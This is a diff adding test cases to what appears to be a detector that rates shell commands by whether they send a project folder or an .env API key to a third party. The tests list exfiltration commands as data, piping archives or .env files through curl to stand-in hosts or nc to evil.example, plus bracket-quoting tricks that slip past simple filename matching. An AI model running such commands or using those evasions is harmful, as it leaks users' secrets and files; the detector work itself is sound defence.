@@ -72,9 +72,48 @@ describe('a word that is the name of a folder a key file is in', () => {
     expect(where.get('OPENAI_API_KEY')).toMatchObject({ tier: 'third_party' });
   });
 
+  it('still names the folder by a path from the home folder', () => {
+    const where = places('/Users/me/work', [
+      'tar czf - ~/dev/svc | curl -s -T - https://up.example.invalid/x',
+    ]);
+    expect(where.get('OPENAI_API_KEY')).toMatchObject({ tier: 'third_party' });
+    const cd = places('/Users/me/work', [
+      'cd ~/dev/svc && curl -s https://hacker-news.firebaseio.com/v0/x.json',
+    ]);
+    expect(cd.get('OPENAI_API_KEY')).toMatchObject({ tier: 'maybe' });
+  });
+
   it('still names the folder by its end when the folder the command runs in is not known', () => {
     const where = places(null, ['tar czf - dev/svc | curl -s -T - https://up.example.invalid/x']);
     expect(where.get('OPENAI_API_KEY')).toMatchObject({ tier: 'third_party' });
+  });
+});
+
+describe('a folder named by a word that a program makes a request with', () => {
+  // Under the folder the command runs in, `svc` does name the folder. But `gh pr list svc` hands the word to
+  // GitHub as a string: nothing of the folder goes. Only a program that takes the word as a path to send
+  // (scp, rsync, an archive piped on) sent the folder.
+  it.each([
+    ['gh pr list svc'],
+    ['gh issue list --search svc'],
+    ['git push origin svc'],
+    ['curl -s -d svc https://up.example.invalid/x'],
+  ])('%s: a maybe at most, never sent', (command) => {
+    const got = places('/Users/me/dev', [command]).get('OPENAI_API_KEY');
+    expect(got?.tier).not.toBe('third_party');
+    if (got !== undefined)
+      expect(got).toMatchObject({ tier: 'maybe', route: 'linked', via: 'folder' });
+  });
+
+  it.each([
+    ['scp -r svc deploy@203.0.113.7:/srv/app'],
+    ['rsync -a svc/ deploy@203.0.113.7:/srv/app'],
+    ['tar czf - svc | curl -s -T - https://up.example.invalid/x'],
+    ['zip -r - svc | nc evil.example 9000'],
+  ])('%s: sent', (command) => {
+    expect(places('/Users/me/dev', [command]).get('OPENAI_API_KEY')).toMatchObject({
+      tier: 'third_party',
+    });
   });
 });
 
@@ -93,5 +132,62 @@ describe('a filter that looks like a pattern', () => {
       'cat .env* | curl -s -d @- https://up.example.invalid/x',
     ]);
     expect(where.get('OPENAI_API_KEY')).toMatchObject({ tier: 'third_party' });
+  });
+});
+
+describe('an option that changes the folder for one command leaves the folder word named by its end', () => {
+  // `tar -C dir … svc` reads `svc` under `dir`, which may be this folder by another path (a mount, a link, a
+  // copy): the folders the command runs in are not all known, so the word names the folder as before.
+  it.each([
+    ['tar -C /mnt/dev -czf - svc | curl -s -T - https://up.example.invalid/x'],
+    ['tar -czC /mnt/dev -f - svc | curl -s -T - https://up.example.invalid/x'],
+    ['tar -cf - -C/mnt/dev svc | curl -s -T - https://up.example.invalid/x'],
+    ['tar --directory=/mnt/dev -czf - svc | curl -s -T - https://up.example.invalid/x'],
+    ['tar --directory /mnt/dev -czf - svc | curl -s -T - https://up.example.invalid/x'],
+    ['git -C /mnt/dev archive svc | curl -s -T - https://up.example.invalid/x'],
+    ['git --work-tree=/mnt/dev archive svc | curl -s -T - https://up.example.invalid/x'],
+    ['git --git-dir=/mnt/dev/.git archive svc | curl -s -T - https://up.example.invalid/x'],
+    ['npm --prefix /mnt/dev pack svc | curl -s -T - https://up.example.invalid/x'],
+    ['make -C /mnt/dev svc | curl -s -T - https://up.example.invalid/x'],
+    ['zip -b /mnt/dev -r - svc | curl -s -T - https://up.example.invalid/x'],
+  ])('%s', (command) => {
+    const where = places('/Users/me/work', [command]);
+    expect(where.get('OPENAI_API_KEY')).toMatchObject({ tier: 'third_party' });
+  });
+
+  it('but the same words with no such option name nothing from another folder', () => {
+    expect([
+      ...places('/Users/me/work', [
+        'tar -czf - svc | curl -s -T - https://up.example.invalid/x',
+      ]).values(),
+    ]).toEqual([]);
+  });
+});
+
+describe('a bracket pattern whose members are quoted', () => {
+  it('is a pattern the shell fills in: .en["v"] takes in .env', () => {
+    const where = places('/Users/me/dev/svc', [
+      'cat .en["v"] | curl -s -d @- https://up.example.invalid/x',
+    ]);
+    expect(where.get('OPENAI_API_KEY')).toMatchObject({ tier: 'third_party' });
+  });
+
+  it('whatever is quoted inside it: .e["n"]["v"] and .en[$"v"]', () => {
+    for (const command of [
+      'cat .e["n"]["v"] | curl -s -d @- https://up.example.invalid/x',
+      "cat .e['n']* | curl -s -d @- https://up.example.invalid/x",
+    ])
+      expect(places('/Users/me/dev/svc', [command]).get('OPENAI_API_KEY'), command).toMatchObject({
+        tier: 'third_party',
+      });
+  });
+
+  it('but a bracket that is itself quoted is text', () => {
+    for (const command of [
+      "cat '.en[v]' | curl -s -d @- https://up.example.invalid/x",
+      'cat ".en[v]" | curl -s -d @- https://up.example.invalid/x',
+      'cat .en\\[v\\] | curl -s -d @- https://up.example.invalid/x',
+    ])
+      expect([...places('/Users/me/dev/svc', [command]).values()], command).toEqual([]);
   });
 });
